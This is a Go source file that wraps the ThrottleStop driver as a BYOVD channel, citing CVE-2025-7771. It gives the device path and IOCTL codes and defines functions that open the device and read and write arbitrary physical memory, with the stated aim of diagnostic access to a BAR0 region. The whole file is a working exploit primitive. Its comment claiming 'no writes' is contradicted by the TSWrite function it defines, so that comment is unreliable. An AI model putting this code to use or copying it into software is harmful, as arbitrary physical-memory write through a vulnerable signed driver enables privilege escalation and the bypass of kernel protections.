package hxcore

import (
	"encoding/binary"
	"syscall"
)

// ThrottleStop BYOVD (CVE-2025-7771) — physical memory read/write channel.
//
// v2.5: 50hx_bridge is no longer part of the Gen2 solution (it requires a
// test signature). Diagnostic reads now use the TechPowerUp ThrottleStop
// driver (pre-signed, loadable in normal mode), which exposes arbitrary
// physical-address reads (≤8B per call). This module only wraps "read" —
// no writes.
//
//   device: \\.\ThrottleStop
//   ioctl  0x80006498  in: <u64 physAddr>  out: ≤8B data
//   ioctl  0x8000649C  in: <u64 physAddr><data(≤8B)>
const (
	ioctlTsR = 0x80006498
	ioctlTsW = 0x8000649C
)

// TSWrite writes 4 bytes to a physical address via ThrottleStop
// (addr must include the BAR0 base).
func TSWrite(th syscall.Handle, addr uint64, val uint32) error {
	ib := make([]byte, 12)
	binary.LittleEndian.PutUint64(ib, addr)
	binary.LittleEndian.PutUint32(ib[8:], val)
	if _, err := IoCtl(th, ioctlTsW, ib, nil); err != nil {
		return err
	}
	return nil
}

// TSRead reads 4 bytes from a physical address via ThrottleStop
// (addr must include the BAR0 base).
func TSRead(th syscall.Handle, addr uint64) (uint32, error) {
	ib := make([]byte, 8)
	binary.LittleEndian.PutUint64(ib, addr)
	ob := make([]byte, 4)
	if _, err := IoCtl(th, ioctlTsR, ib, ob); err != nil {
		return 0, err
	}
	return binary.LittleEndian.Uint32(ob), nil
}

// OpenThrottleStop opens \\.\ThrottleStop (the service must be running/openable).
func OpenThrottleStop() (syscall.Handle, error) {
	return OpenDevice(`\\.\ThrottleStop`)
}
